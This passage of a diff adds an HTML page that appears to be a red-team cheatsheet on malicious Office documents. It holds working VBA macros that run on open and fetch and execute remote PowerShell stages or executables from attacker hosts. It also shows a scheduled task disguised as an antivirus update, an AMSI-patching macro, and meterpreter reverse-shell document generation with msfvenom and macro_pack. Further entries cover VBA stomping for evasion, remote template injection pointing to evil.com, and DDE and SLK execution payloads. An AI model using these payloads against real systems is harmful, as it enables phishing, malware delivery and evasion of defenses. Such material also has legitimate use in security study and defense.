+<p>A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.</p>
+</blockquote>
+<p>https://github.com/trustedsec/unicorn</p>
+<pre><code class="language-ps1">python unicorn.py payload.cs cs macro
+</code></pre>
+<h2 id="docm-vba-wscript">DOCM - VBA Wscript</h2>
+<blockquote>
+<p>https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office</p>
+</blockquote>
+<pre><code class="language-ps1">Sub parent_change()
+    Dim objOL
+    Set objOL = CreateObject(&quot;Outlook.Application&quot;)
+    Set shellObj = objOL.CreateObject(&quot;Wscript.Shell&quot;)
+    shellObj.Run(&quot;notepad.exe&quot;)
+End Sub
+Sub AutoOpen()
+    parent_change
+End Sub
+Sub Auto_Open()
+    parent_change
+End Sub
+</code></pre>
+<pre><code class="language-vb">CreateObject(&quot;WScript.Shell&quot;).Run &quot;calc.exe&quot;
+CreateObject(&quot;WScript.Shell&quot;).Exec &quot;notepad.exe&quot;
+</code></pre>
+<h2 id="docm-vba-shell-execute-comment">DOCM - VBA Shell Execute Comment</h2>
+<p>Set your command payload inside the <strong>Comment</strong> metadata of the document.</p>
+<pre><code class="language-vb">Sub beautifulcomment()
+    Dim p As DocumentProperty
+    For Each p In ActiveDocument.BuiltInDocumentProperties
+        If p.Name = &quot;Comments&quot; Then
+            Shell (p.Value)
+        End If
+    Next
+End Sub
+
+Sub AutoExec()
+    beautifulcomment
+End Sub
+
+Sub AutoOpen()
+    beautifulcomment
+End Sub
+</code></pre>
+<h2 id="docm-vba-spawning-via-svchostexe-using-scheduled-task">DOCM - VBA Spawning via svchost.exe using Scheduled Task</h2>
+<pre><code class="language-ps1">Sub AutoOpen()
+    Set service = CreateObject(&quot;Schedule.Service&quot;)
+    Call service.Connect
+    Dim td: Set td = service.NewTask(0)
+    td.RegistrationInfo.Author = &quot;Kaspersky Corporation&quot;
+    td.settings.StartWhenAvailable = True
+    td.settings.Hidden = False
+    Dim triggers: Set triggers = td.triggers
+    Dim trigger: Set trigger = triggers.Create(1)
+    Dim startTime: ts = DateAdd(&quot;s&quot;, 30, Now)
+    startTime = Year(ts) &amp; &quot;-&quot; &amp; Right(Month(ts), 2) &amp; &quot;-&quot; &amp; Right(Day(ts), 2) &amp; &quot;T&quot; &amp; Right(Hour(ts), 2) &amp; &quot;:&quot; &amp; Right(Minute(ts), 2) &amp; &quot;:&quot; &amp; Right(Second(ts), 2)
+    trigger.StartBoundary = startTime
+    trigger.ID = &quot;TimeTriggerId&quot;
+    Dim Action: Set Action = td.Actions.Create(0)
+    Action.Path = &quot;C:\Windows\System32\powershell.exe&quot;
+    Action.Arguments = &quot;-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))&quot;
+    Call service.GetFolder(&quot;\&quot;).RegisterTaskDefinition(&quot;AVUpdateTask&quot;, td, 6, , , 3)
+End Sub
+Rem powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))&quot;
+</code></pre>
+<h2 id="docm-wmi-com-functions">DOCM - WMI COM functions</h2>
+<p>Basic WMI exec (detected by Defender) : <code>r = GetObject("winmgmts:\\.\root\cimv2:Win32_Process").Create("calc.exe", null, null, intProcessID)</code></p>
+<pre><code class="language-ps1">Sub wmi_exec()
+    strComputer = &quot;.&quot;
+    Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;)
+    Set objStartUp = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)
+    Set objProc = objWMIService.Get(&quot;Win32_Process&quot;)
+    Set procStartConfig = objStartUp.SpawnInstance_
+    procStartConfig.ShowWindow = 1
+    objProc.Create &quot;powershell.exe&quot;, Null, procStartConfig, intProcessID
+End Sub
+</code></pre>
+<ul>
+<li>https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3</li>
+<li>https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2</li>
+</ul>
+<pre><code class="language-ps1">Sub ASR_bypass_create_child_process_rule5()
+    Const HIDDEN_WINDOW = 0
+    strComputer = &quot;.&quot;
+    Set objWMIService = GetObject(&quot;win&quot; &amp; &quot;mgmts&quot; &amp; &quot;:\\&quot; &amp; strComputer &amp; &quot;\root&quot; &amp; &quot;\cimv2&quot;)
+    Set objStartup = objWMIService.Get(&quot;Win32_&quot; &amp; &quot;Process&quot; &amp; &quot;Startup&quot;)
+    Set objConfig = objStartup.SpawnInstance_
+    objConfig.ShowWindow = HIDDEN_WINDOW
+    Set objProcess = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root&quot; &amp; &quot;\cimv2&quot; &amp; &quot;:Win32_&quot; &amp; &quot;Process&quot;)
+    objProcess.Create &quot;cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')&quot;, Null, objConfig, intProcessID
+End Sub
+
+Sub AutoExec()
+    ASR_bypass_create_child_process_rule5
+End Sub
+
+Sub AutoOpen()
+    ASR_bypass_create_child_process_rule5
+End Sub
+</code></pre>
+<pre><code class="language-ps1">Const ShellWindows = &quot;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}&quot;
+Set SW = GetObject(&quot;new:&quot; &amp; ShellWindows).Item()
+SW.Document.Application.ShellExecute &quot;cmd.exe&quot;, &quot;/c powershell.exe&quot;, &quot;C:\Windows\System32&quot;, Null, 0
+</code></pre>
+<h2 id="docmxlm-macro-pack-macro-and-dde">DOCM/XLM - Macro Pack - Macro and DDE</h2>
+<blockquote>
+<p>Only the community version is available online.</p>
+</blockquote>
+<ul>
+<li><a href="https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe">https://github.com/sevagas/macro_pack</a></li>
+</ul>
+<pre><code class="language-powershell"># Options
+-G, --generate=OUTPUT_FILE_PATH. Generates a file. 
+-t, --template=TEMPLATE_NAME    Use code template already included in MacroPack
+-o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name)
+
+# Execute a command
+echo &quot;calc.exe&quot; | macro_pack.exe -t CMD -G cmd.xsl
+
+# Download and execute a file
+echo &lt;file_to_drop_url&gt; &quot;&lt;download_path&gt;&quot; | macro_pack.exe -t DROPPER -o -G dropper.xls
+
+# Meterpreter reverse TCP template using MacroMeter by Cn33liz
+echo &lt;ip&gt; &lt;port&gt; | macro_pack.exe -t METERPRETER -o -G meter.docm
+
+# Drop and execute embedded file
+macro_pack.exe -t EMBED_EXE --embed=c:\windows\system32\calc.exe -o -G my_calc.vbs
+
+# Obfuscate the vba file generated by msfvenom and put result in a new vba file.
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba
+
+# Obfuscate Empire stager vba file and generate a MS Word document:
+macro_pack.exe -f empire.vba -o -G myDoc.docm
+
+# Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)
+echo &quot;https://myurl.url/payload.exe&quot; &quot;dropped.exe&quot; |  macro_pack.exe -o -t DROPPER -G &quot;drop.xlsm&quot; 
+
+# Execute calc.exe via Dynamic Data Exchange (DDE) attack
+echo calc.exe | macro_pack.exe --dde -G calc.xslx
+
+# Download and execute file via powershell using Dynamic Data Exchange (DDE) attack
+macro_pack.exe --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.xsl
+
+# PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV).
+msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --keep-alive  -G  out.docm
+
+# PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses.
+msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --trojan -G  hotpics.pptm
+
+# PRO: Generate an HTA payload able to run a shellcode via Excel injection
+echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE  --run-in-excel -o -G samples\nicepic.hta
+echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\my_shortcut.lnk
+
+# PRO: XLM Injection
+echo &quot;MPPro&quot; | macro_pack.exe -G _samples\hello.doc -t HELLO --xlm --run-in-excel
+
+# PRO: ShellCode Exec - Heap Injection, AlternativeInjection
+echo &quot;x32calc.bin&quot; | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc
+echo &quot;x32calc.bin&quot; | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc
+
+# PRO: More shellcodes
+echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm –keep-alive
+echo &quot;x86.bin&quot; &quot;x64.bin&quot; | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc
+echo &quot;http://192.168.5.10:8080/x32calc.bin&quot; &quot;http://192.168.5.10:8080/x64calc.bin&quot; | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls
+</code></pre>
+<h2 id="docm-badassmacros">DOCM - BadAssMacros</h2>
+<blockquote>
+<p>C# based automated Malicous Macro Generator.</p>
+</blockquote>
+<ul>
+<li>https://github.com/Inf0secRabbit/BadAssMacros</li>
+</ul>
+<pre><code class="language-powershell">BadAssMacros.exe -h
+
+# Create VBA for classic shellcode injection from raw shellcode
+BadAssMacros.exe -i &lt;path_to_raw_shellcode_file&gt; -w &lt;doc/excel&gt; -p no -s classic -c &lt;caesar_shift_value&gt; -o &lt;path_to_output_file&gt;
+BadAssMacros.exe -i .\Desktop\payload.bin -w doc -p no -s classic -c 23 -o .\Desktop\output.txt
+
+# Create VBA for indirect shellcode injection from raw shellcode
+BadAssMacros.exe -i &lt;path_to_raw_shellcode_file&gt; -w &lt;doc/excel&gt; -p no -s indirect -o &lt;path_to_output_file&gt;
+
+# List modules inside Doc/Excel file
+BadAssMacros.exe -i &lt;path_to_doc/excel_file&gt; -w &lt;doc/excel&gt; -p yes -l
+
+# Purge Doc/Excel file
+BadAssMacros.exe -i &lt;path_to_doc/excel_file&gt; -w &lt;doc/excel&gt; -p yes -o &lt;path_to_output_file&gt; -m &lt;module_name&gt;
+</code></pre>
+<h2 id="docm-cactustorch-vba-module">DOCM - CACTUSTORCH VBA Module</h2>
+<blockquote>
+<p>CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript</p>
+</blockquote>
+<ul>
+<li>https://github.com/mdsecactivebreach/CACTUSTORCH</li>
+<li>https://github.com/tyranid/DotNetToJScript/</li>
+<li>CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY</li>
+<li>
+<p>CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ</p>
+</li>
+<li>
+<p>Import <strong>.cna</strong> in Cobalt Strike</p>
+</li>
+<li>Generate a new VBA payload from the CACTUSTORCH menu</li>
+<li>Download DotNetToJscript</li>
+<li>Compile it <ul>
+<li><strong>DotNetToJscript.exe</strong> - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript</li>
+<li><strong>ExampleAssembly.dll</strong> - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text "test"</li>
+</ul>
+</li>
+<li>Execute <strong>DotNetToJscript.exe</strong> and supply it with the ExampleAssembly.dll, specify the output file and the output type
+    <code>ps1
+    DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch</code></li>
+<li>Use the generated code to replace the hardcoded binary in CactusTorch</li>
+</ul>
+<h2 id="docm-mmg-with-custom-dl-exec">DOCM - MMG with Custom DL + Exec</h2>
+<ol>
+<li>Custom Download in first Macro to "C:\Users\Public\beacon.exe"</li>
+<li>Create a custom binary execute using MMG</li>
+<li>Merge both Macro</li>
+</ol>
+<pre><code class="language-ps1">git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
+python MMG.py configs/generic-cmd.json malicious.vba
+{
+    &quot;description&quot;: &quot;Generic command exec payload\nEvasion technique set to none&quot;,
+    &quot;template&quot;: &quot;templates/payloads/generic-cmd-template.vba&quot;,
+    &quot;varcount&quot;: 152,
+    &quot;encodingoffset&quot;: 5,
+    &quot;chunksize&quot;: 180,
+    &quot;encodedvars&quot;:  {},
+    &quot;vars&quot;:     [],
+    &quot;evasion&quot;:  [&quot;encoder&quot;],
+    &quot;payload&quot;: &quot;cmd.exe /c C:\\Users\\Public\\beacon.exe&quot;
+}
+</code></pre>
+<pre><code class="language-vb">Private Declare PtrSafe Function URLDownloadToFile Lib &quot;urlmon&quot; Alias &quot;URLDownloadToFileA&quot; (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
+
+Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean
+    On Error GoTo Failed
+    DownloadFileA = False
+    'As directory must exist, this is a check
+    If CreateObject(&quot;Scripting.FileSystemObject&quot;).FolderExists(CreateObject(&quot;Scripting.FileSystemObject&quot;).GetParentFolderName(DownloadPath)) = False Then Exit Function
+    Dim returnValue As Long
+    returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0)
+    'If return value is 0 and the file exist, then it is considered as downloaded correctly
+    DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) &gt; 0)
+    Exit Function
+
+Failed:
+End Function
+
+Sub AutoOpen()
+    DownloadFileA &quot;http://10.10.10.10/macro.exe&quot;, &quot;C:\\Users\\Public\\beacon.exe&quot;
+End Sub
+
+
+Sub Auto_Open()
+    DownloadFileA &quot;http://10.10.10.10/macro.exe&quot;, &quot;C:\\Users\\Public\\beacon.exe&quot;
+End Sub
+</code></pre>
+<h2 id="docm-activex-based-inkpicture-control-painted-event-autorun-macro">DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro</h2>
+<p>Go to <strong>Developer tab</strong> on ribbon <code>-&gt; Insert -&gt; More Controls -&gt; Microsoft InkPicture Control</code> </p>
+<pre><code class="language-vb">Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
+Run = Shell(&quot;cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://&lt;host&gt;/file.exe','file.exe');Start-Process 'file.exe'&quot;, vbNormalFocus)
+End Sub
+</code></pre>
+<h2 id="vba-obfuscation">VBA Obfuscation</h2>
+<pre><code class="language-ps1"># https://www.youtube.com/watch?v=L0DlPOLx2k0
+$ git clone https://github.com/bonnetn/vba-obfuscator
+$ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin
+</code></pre>
+<h2 id="vba-purging">VBA Purging</h2>
+<p><strong>VBA Stomping</strong>: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. </p>
+<p>:warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.</p>
+<h3 id="officepurge">OfficePurge</h3>
+<ul>
+<li>https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe</li>
+</ul>
+<pre><code class="language-powershell">OfficePurge.exe -d word -f .\malicious.doc -m NewMacros
+OfficePurge.exe -d excel -f .\payroll.xls -m Module1
+OfficePurge.exe -d publisher -f .\donuts.pub -m ThisDocument
+OfficePurge.exe -d word -f .\malicious.doc -l
+</code></pre>
+<h3 id="evilclippy">EvilClippy</h3>
+<blockquote>
+<p>Evil Clippy uses the OpenMCDF library to manipulate CFBF files. 
+Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows.
+If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this.</p>
+</blockquote>
+<pre><code class="language-ps1"># OSX/Linux
+mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 
+# Windows
+csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 
+
+EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
+EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
+EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc
+
+# make macro code unaccessible is to mark the project as locked and unviewable: -u
+# Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.
+EvilClippy.exe -r macrofile.doc
+</code></pre>
+<h2 id="vba-offensive-security-template">VBA - Offensive Security Template</h2>
+<ul>
+<li>Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba</li>
+<li>Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process</li>
+<li>RunPE - https://github.com/itm4n/VBA-RunPE</li>
+<li>Spoof Parent - https://github.com/py7hagoras/OfficeMacro64</li>
+<li>AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba</li>
+<li>amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3</li>
+<li>VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba</li>
+</ul>
+<h2 id="vba-amsi">VBA - AMSI</h2>
+<blockquote>
+<p>The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</p>
+</blockquote>
+<p><img alt="" src="https://www.microsoft.com/security/blog/wp-content/uploads/2018/09/fig2-runtime-scanning-amsi-8-1024x482.png" /></p>
+<p>:warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy).</p>
+<p>The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro</p>
+<ul>
+<li>AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass</li>
+</ul>
+<pre><code class="language-vb">Private Declare PtrSafe Function GetProcAddress Lib &quot;kernel32&quot; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Function LoadLibrary Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal lpLibFileName As String) As LongPtr
+Private Declare PtrSafe Function VirtualProtect Lib &quot;kernel32&quot; (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
+Private Declare PtrSafe Sub CopyMemory Lib &quot;kernel32&quot; Alias &quot;RtlMoveMemory&quot; (Destination As Any, Source As Any, ByVal Length As LongPtr)
+
+Private Sub Document_Open()
+    Dim AmsiDLL As LongPtr
+    Dim AmsiScanBufferAddr As LongPtr
+    Dim result As Long
+    Dim MyByteArray(6) As Byte
+    Dim ArrayPointer As LongPtr
+
+    MyByteArray(0) = 184 ' 0xB8
+    MyByteArray(1) = 87  ' 0x57
+    MyByteArray(2) = 0   ' 0x00
+    MyByteArray(3) = 7   ' 0x07
+    MyByteArray(4) = 128 ' 0x80
+    MyByteArray(5) = 195 ' 0xC3
+
+    AmsiDLL = LoadLibrary(&quot;amsi.dll&quot;)
+    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, &quot;AmsiScanBuffer&quot;)
+    result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0)
+    ArrayPointer = VarPtr(MyByteArray(0))
+    CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6
+
+End Sub
+</code></pre>
+<h2 id="docx-template-injection">DOCX - Template Injection</h2>
+<p>:warning: Does not require "Enable Macro"</p>
+<h3 id="remote-template">Remote Template</h3>
+<ol>
+<li>A malicious macro is saved in a Word template .dotm file</li>
+<li>Benign .docx file is created based on one of the default MS Word Document templates</li>
+<li>Document from step 2 is saved as .docx</li>
+<li>Document from step 3 is renamed to .zip</li>
+<li>Document from step 4 gets unzipped</li>
+<li><strong>.\word_rels\settings.xml.rels</strong> contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).
+    <code>xml
+    &lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
+    &lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx" TargetMode="External"/&gt;&lt;/Relationships&gt;</code>
+    <code>xml
+    &lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+    Target="https://evil.com/malicious.dotm" TargetMode="External"/&gt;&lt;/Relationships&gt;</code></li>
+<li>File gets zipped back up again and renamed to .docx</li>
+</ol>
+<h3 id="template-injections-tools">Template Injections Tools</h3>
+<ul>
+<li>https://github.com/JohnWoodman/remoteInjector</li>
+<li>https://github.com/ryhanson/phishery</li>
+</ul>
+<pre><code class="language-ps1">$ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
+[+] Opening Word document: good.docx
+[+] Setting Word document template to: https://secure.site.local/docs
+[+] Saving injected Word document to: bad.docx
+[*] Injected Word document has been saved!
+</code></pre>
+<h2 id="docx-dde">DOCX - DDE</h2>
+<ul>
+<li>Insert &gt; QuickPart &gt; Field</li>
+<li>Right Click &gt; Toggle Field Code</li>
+<li><code>{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }</code></li>
+</ul>
+<h2 id="slk-excel">SLK - Excel</h2>
+<pre><code class="language-ps1">ID;P
+O;E
+NN;NAuto_open;ER101C1;KOut Flank;F
+C;X1;Y101;K0;EEXEC(&quot;c:\shell.cmd&quot;)
+C;X1;Y102;K0;EHALT()
+E
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://itm4n.github.io/vba-runpe-part1/">VBA RunPE Part 1 - itm4n</a></li>
+<li><a href="https://itm4n.github.io/vba-runpe-part2/">VBA RunPE Part 2 - itm4n</a></li>
+<li><a href="https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/">Office VBA AMSI Parting the veil on malicious macros - Microsoft</a></li>
+<li><a href="https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/">Bypassing AMSI fro VBA - Outflank</a></li>
+<li><a href="https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/">Evil Clippy MS Office Maldoc Assistant - Outflank</a></li>
+<li><a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/">Old schoold evil execl 4.0 macros XLM - Outflank</a></li>
+<li><a href="https://bytecod3r.io/excel-4-macro-generator-x86-x64/">Excel 4 Macro Generator x86/x64 - bytecod3r</a></li>
+<li><a href="https://github.com/Pepitoh/VBad">VBad - Pepitoh</a></li>
+<li><a href="https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf">Excel 4.0 Macro Function Reference PDF</a></li>
+<li><a href="https://www.sneakymonkey.net/2020/06/22/excel-4-0-macros-so-hot-right-now/">Excel 4.0 Macros so hot right now - SneekyMonkey</a></li>
+<li><a href="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/">Macros and more with sharpshooter v2.0 - mdsec</a></li>
+<li><a href="https://malware.pizza/2020/06/19/further-evasion-in-the-forgotten-corners-of-ms-xls/">Further evasion in the forgotten corners of ms xls - malware.pizza</a></li>
+<li><a href="https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9">Excel 4.0 macro old but new - fsx30</a></li>
+<li><a href="https://d-sec.net/2020/10/24/xls-4-0-macros-and-covenant/">XLS 4.0 macros and covenant - d-sec</a></li>
+<li><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros">Inject macro from a remote dotm template - ired.team</a></li>
+<li><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk">Phishinh with OLE - ired.team</a></li>
+<li><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel">Phishing SLK - ired.team</a>bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)</li>
+<li><a href="https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/">PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018</a></li>
+<li><a href="https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/">AMSI in the heap - rmdavy</a></li>
+<li><a href="https://github.com/rmdavy/WordAmsiBypass">WordAMSIBypass - rmdavy</a></li>
+<li><a href="https://blog.f-secure.com/dechaining-macros-and-evading-edr/">Dechaining macros and evading EDR - Noora Hyvärinen</a></li>
+<li><a href="http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html">Executing macros from docx with remote - RedXORBlueJuly 18, 2018</a></li>
+<li><a href="https://adepts.of0x.cc/alternatives-copy-shellcode/">One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021</a></li>
+<li><a href="http://www.greyhathacker.net/?p=948">Running macros via ActiveX controls - greyhathacker - September 29, 2016</a></li>
+<li><a href="https://www.goggleheadedhacker.com/blog/post/23">Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental</a></li>
+</ul>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      Last update:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 30, 2022</span>
+      
+    
+  </small>
+</div>
+
+
+
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../Network%20Pivoting%20Techniques/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Network Pivoting Techniques" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Network Pivoting Techniques
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../Powershell%20-%20Cheatsheet/" class="md-footer__link md-footer__link--next" aria-label="Next: Powershell" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Powershell
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.top", "navigation.tracking"], "search": "../../assets/javascripts/workers/search.ecf98df9.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.2ab50757.min.js"></script>
+      
+    
+  </body>
+</html>
